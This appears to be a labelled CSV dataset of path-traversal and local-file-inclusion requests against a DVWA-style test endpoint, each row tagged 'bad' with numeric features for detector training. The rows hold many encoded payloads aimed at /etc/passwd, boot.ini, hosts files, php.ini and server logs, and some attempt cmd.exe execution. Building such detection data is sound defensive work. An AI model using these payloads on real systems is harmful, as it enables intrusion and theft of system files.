method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=\..Á%8s\..Á%8s\..Á%8s\..Á%8s\..Á%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®%5cà€®à€®%5cà€®à€®%5cà€®à€®%5cà€®à€®%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..ð€€¯..ð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^Á%pcÀ^À^Á%pcÀ^À^Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?Á¯.?Á¯.?Á¯.?Á¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/usr/lib/php.ini,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\\\..\..\..\..\..\..\..\..\{FILE},,0,8,7,4,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%2%fetc%2%fissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../opt/lampp/logs/error.log,,15,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??ÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??%u2216??%u2216??%u2216??%u2216??%u2216??%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%u2215..%u2215..%u2215,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁœ%ÀnÀnÁœ%ÀnÀnÁœetcÁœpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..À\..À\..À\..À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../apache2/logs/error.log,,15,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Áœð€€®ð€€®ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Áð€€®ð€€®Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../,,13,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ%8s%ÀnÀnÁ%8s%ÀnÀnÁ%8s%ÀnÀnÁ%8s%ÀnÀnÁ%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/\../\../\../\../boot.ini,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%uff0e%uff0eÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.\..\{FILE},,0,1,1,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/proc/net/udp,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..À%qf\..À%qf\..À%qf\..À%qf\..À%qf\..À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.À\?.À\etcÀ\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../../../../../../../../etc/passwd,,22,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE},,0,4,3,2,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%bg%qfü€€€€®ü€€€€®%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=~/.bash_profile,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%uEFC8ð€€®ð€€®%uEFC8ð€€®ð€€®%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..0x2f..0x2f..0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?Á.?Á.?Á.?Á.?Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%bg%qf..../%bg%qf..../%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,3,0,0,0,0,3,2,bad
GET,/vulnerabilities/fi/?page=.../.%u2215.../.%u2215etc%u2215passwd,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..///..///..////etc/passwd,,3,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Áœø€€€®ø€€€®Áœø€€€®ø€€€®Áœø€€€®ø€€€®Áœø€€€®ø€€€®Áœø€€€®ø€€€®Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html,,0,4,3,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À%9v..À%9v..À%9v..À%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯%c0%ae%c0%aeø€€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®ø€€€¯etcø€€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c/etc/passwd,,0,1,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®ø€€€¯ð€€®ð€€®ø€€€¯etcø€€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/hostname.dnet0,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/httpd/php.ini,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^ÁœÀ^À^ÁœÀ^À^ÁœÀ^À^Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁœÀþÀþÁœÀþÀþÁœÀþÀþÁœÀþÀþÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/,,6,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/usr/local/apache2/conf/extra/httpd-ssl.conf,,0,0,0,0,0,0,7,bad
GET,/vulnerabilities/fi/?page=/var/apache/logs/error.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ\ÀîÀîÀ\ÀîÀîÀ\ÀîÀîÀ\ÀîÀîÀ\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%uEFC8.../.%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..%5c\..%5c\..%5c\..%5cetc%5cpasswd,,0,4,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%bg%qf%2%e%2%e%bg%qf%2%e%2%e%bg%qf%2%e%2%e%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.À\À.À.À\{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À.À./À.À./À.À./À.À./À.À./À.À./À.À./{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=??%uEFC8etc%uEFC8issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á¯..Á¯..Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®Á%8sà€®à€®Á%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%2%f.../.%2%f.../.%2%f.../.%2%f.../.%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%2f..%2f..%2f..%2f,,4,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/var/log/syslog.0,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/log/message,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\\\..\\\..\\\..\\\..\\\etc\\\issue,,0,5,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®/ü€€€€®ü€€€€®/ü€€€€®ü€€€€®/ü€€€€®ü€€€€®/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/...\boot.ini,,0,1,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/À.À./À.À./À.À./À.À./À.À./À.À./À.À./{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f..%2f/etc/passwd,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®\à€®à€®\à€®à€®\à€®à€®\à€®à€®\à€®à€®\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/hosts,,12,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.%2f?.%2f?.%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/php/php.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%5%cÀ^À^%5%cÀ^À^%5%cÀ^À^%5%cÀ^À^%5%cÀ^À^%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},,7,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..\..\..\../winnt/system32/cmd.exe?/c+dir+c:\,,1,3,3,2,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®/À®À®/À®À®/À®À®/À®À®/etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ%8s%ÀnÀnÁ%8s%ÀnÀnÁ%8s%ÀnÀnÁ%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/mail/nobody,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\logs\httpd\error_log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../../../etc/issue,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.0x2f?.0x2f?.0x2f?.0x2f?.0x2f?.0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../..//../{FILE},,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},,2,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%2fboot.ini,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,,0,8,7,4,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À%qfü€€€€®ü€€€€®À%qfü€€€€®ü€€€€®À%qfü€€€€®ü€€€€®À%qfü€€€€®ü€€€€®À%qfü€€€€®ü€€€€®À%qfetcÀ%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁ%8s%2e%2eÁ%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:/program,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfð€€®ð€€®À%qfð€€®ð€€®À%qfð€€®ð€€®À%qfð€€®ð€€®À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%bg%qf?.%bg%qf?.%bg%qf?.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216..%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vÀîÀîÀ%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/apache/logs/error_log,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=À^À^0x2fÀ^À^0x2fÀ^À^0x2fÀ^À^0x2fÀ^À^0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini,,0,8,7,4,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?\.?\.?\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.ð€€¯À.À.ð€€¯À.À.ð€€¯À.À.ð€€¯À.À.ð€€¯À.À.ð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÀ/%uff0e%uff0eÀ/%uff0e%uff0eÀ/%uff0e%uff0eÀ/%uff0e%uff0eÀ/windowsÀ/system32À/driversÀ/etcÀ/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\..\..\..\../winnt/system32/cmd.exe?/c+dir+c:\,,1,7,7,4,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%u2216À^À^%u2216À^À^%u2216À^À^%u2216À^À^%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®0x5cÀ®À®0x5cÀ®À®0x5cÀ®À®0x5cÀ®À®0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\\\..\..\..\..\..\..\..\/etc/passwd,,0,7,6,3,0,0,2,bad
GET,/vulnerabilities/fi/?page=??À\??À\??À\??À\etcÀ\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.\/\.\.\/\.\.\/\.\{FILE},,0,0,2,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=à€®à€®%bg%qfà€®à€®%bg%qfà€®à€®%bg%qfà€®à€®%bg%qfetc%bg%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%2%f\..%2%f\..%2%f\..%2%f\..%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.?\.?\.?\.?\.?\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%u2215..%u2215..%u2215..%u2215etc%u2215issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%uF025?.%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfð€€®ð€€®À%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..%5c\..%5c\..%5cetc%5cissue,,0,3,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=L2V0Yy9wYXNzd2QlMDA=,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À./À.À./À.À./À.À./À.À./À.À./À.À./À.À.//etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À/..À/..À/..À/..À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,7,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/../..//../..//..///,,5,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=~/.xinitrc,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À^À^ø€€€¯À^À^ø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ/0x2e0x2eÀ/0x2e0x2eÀ/0x2e0x2eÀ/0x2e0x2eÀ/0x2e0x2eÀ/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\boot.ini,,0,3,258,1,0,0,1,bad
